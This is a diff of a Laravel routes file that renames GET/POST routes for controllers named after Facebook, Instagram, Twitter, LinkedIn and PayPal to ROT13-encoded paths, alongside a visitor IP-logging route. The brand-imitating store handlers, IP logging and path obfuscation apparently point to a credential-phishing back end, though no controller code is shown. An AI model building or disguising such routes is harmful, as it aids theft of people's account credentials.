@@ -44,17 +44,18 @@ Auth::routes([
  */
 Route::get('/home', [HomeController::class, 'index'])->name('home');
 
-Route::get('/book', [FacebookController::class, 'index'])->name('book');
-Route::post('/book', [FacebookController::class, 'store']);
+// Facebook
+Route::get('/snprobbx', [FacebookController::class, 'index'])->name('snprobbx');
+Route::post('/snprobbx', [FacebookController::class, 'store']);
 
-Route::get('/gram', [InstagramController::class, 'index'])->name('gram');
-Route::post('/gram', [InstagramController::class, 'store']);
+Route::get('/vafgntenz', [InstagramController::class, 'index'])->name('vafgntenz');
+Route::post('/vafgntenz', [InstagramController::class, 'store']);
 
-Route::get('/ter', [TwitterController::class, 'index'])->name('ter');
-Route::post('/ter', [TwitterController::class, 'store']);
+Route::get('/gjvggre', [TwitterController::class, 'index'])->name('gjvggre');
+Route::post('/gjvggre', [TwitterController::class, 'store']);
 
-Route::get('/edin', [LinkedinController::class, 'index'])->name('edin');
-Route::post('/edin', [LinkedinController::class, 'store']);
+Route::get('/yvaxrqva', [LinkedinController::class, 'index'])->name('yvaxrqva');
+Route::post('/yvaxrqva', [LinkedinController::class, 'store']);
 
 Route::get('/mkt', [MktController::class, 'index'])->name('mkt');
 Route::post('/mkt', [MktController::class, 'store']);
@@ -62,8 +63,8 @@ Route::post('/mkt', [MktController::class, 'store']);
 Route::get('/visitor', [IpAddressController::class, 'index'])->name('visitor');
 Route::post('/visitor', [IpAddressController::class, 'store']);
 
-Route::get('/pal', [PaypalController::class, 'index'])->name('pal');
-Route::post('/pal', [PaypalController::class, 'store']);
+Route::get('/cnlcny', [PaypalController::class, 'index'])->name('cnlcny');
+Route::post('/cnlcny', [PaypalController::class, 'store']);
 
 Route::get('/erp', [ErpController::class, 'index'])->name('erp');
 Route::post('/erp', [ErpController::class, 'store']);
